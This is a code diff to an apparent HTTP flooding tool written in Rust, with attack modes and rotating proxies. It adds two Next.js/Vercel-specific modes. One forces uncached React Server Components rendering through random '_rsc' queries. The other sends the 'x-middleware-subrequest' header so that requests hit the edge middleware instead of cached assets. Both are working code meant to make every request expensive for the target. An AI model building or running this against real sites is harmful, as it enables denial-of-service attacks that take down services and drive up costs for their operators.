@@ -978,6 +978,49 @@ async fn fetch_bandwidth(c: Client, url: String, delay: u64, proxy_idx: usize, s
     Ok((bytes, status))
 }
 
+/// SSR mode: force server-side rendering by requesting the React Server
+/// Components (RSC) payload. Real Next.js/Vercel targets render HTML on the
+/// server for these requests; without the `?_rsc` + `text/x-component` Accept
+/// the request would just be a static page GET (identical to Normal).
+async fn fetch_ssr(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
+    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
+    let sep = if url.contains('?') { '&' } else { '?' };
+    let rsc = format!("{}{}_rsc={:x}", url, sep, rand::random::<u32>());
+    if verbose {
+        println!("[VERBOSE] fetch_ssr: GET {} (Accept: text/x-component) (proxy #{})", rsc, proxy_idx);
+    }
+    let builder = browser_request(c.get(&rsc), false)
+        .header("Accept", "text/x-component")
+        .header("Cache-Control", "no-cache");
+    let builder = add_session_cookie(builder, proxy_idx, &sessions);
+    let resp = send_with_retry(builder, max_retries, "fetch_ssr").await?;
+    let status = resp.status().as_u16();
+    update_session_from_headers(proxy_idx, &sessions, resp.headers());
+    let bytes = resp.bytes().await?.len();
+    Ok((bytes, status))
+}
+
+/// Middleware mode: exercise the Next.js edge middleware interception path.
+/// Middleware runs on every request to the root; sending the
+/// `x-middleware-subrequest` header (which Next.js itself uses to prevent
+/// middleware recursion) makes the request actually traverse the middleware
+/// layer rather than resolving to a cached static asset.
+async fn fetch_middleware(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
+    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
+    if verbose {
+        println!("[VERBOSE] fetch_middleware: GET {} (x-middleware-subrequest) (proxy #{})", url, proxy_idx);
+    }
+    let builder = browser_request(c.get(&url), false)
+        .header("x-middleware-subrequest", "pages/_app")
+        .header("Cache-Control", "no-cache");
+    let builder = add_session_cookie(builder, proxy_idx, &sessions);
+    let resp = send_with_retry(builder, max_retries, "fetch_middleware").await?;
+    let status = resp.status().as_u16();
+    update_session_from_headers(proxy_idx, &sessions, resp.headers());
+    let bytes = resp.bytes().await?.len();
+    Ok((bytes, status))
+}
+
 struct LatencySamples {
     samples: Vec<AtomicU32>,
     idx: AtomicUsize,
@@ -1735,12 +1778,10 @@ async fn run_load(state: Arc<Mutex<AppState>>, pool: Arc<std::sync::Mutex<ProxyP
                             fetch_cookie(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                         }
                         AttackMode::Ssr => {
-                            if assets.is_empty() { fetch_page(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await }
-                            else { fetch_page(client, assets[idx1].clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await }
+                            fetch_ssr(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                         }
                         AttackMode::Middleware => {
-                            if assets.is_empty() { fetch_page(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await }
-                            else { fetch_page(client, assets[idx1].clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await }
+                            fetch_middleware(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                         }
                         AttackMode::RequestFlood => {
                             fetch_page(client, target.clone(), 0, idx, sessions_clone.clone(), verbose, max_retries).await
